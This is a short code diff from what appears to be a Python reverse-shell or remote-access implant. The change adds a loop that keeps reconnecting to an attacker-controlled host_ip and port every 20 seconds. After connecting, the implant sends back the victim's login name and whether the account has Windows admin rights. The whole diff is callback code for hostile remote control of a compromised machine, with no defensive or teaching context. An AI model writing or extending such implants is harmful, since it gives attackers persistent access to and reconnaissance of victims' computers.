@@ -26,10 +26,19 @@ def inbound():
             except Exception:
                 sock.close()
 
+def connection():
+    while True:
+        time.sleep(20)
+        try:
+            print(f'[+] Connection to {host_ip}')
+            sock.connect((host_ip, host_port))
+
+        except:
+            connection()
+
 def session_handler():
     try:
-        print(f'[+] Connection to {host_ip}')
-        sock.connect((host_ip, host_port))
+        connection()
         outbound(os.getlogin())
         outbound(ctypes.windll.shell32.IsUserAnAdmin)
         time.sleep(1)
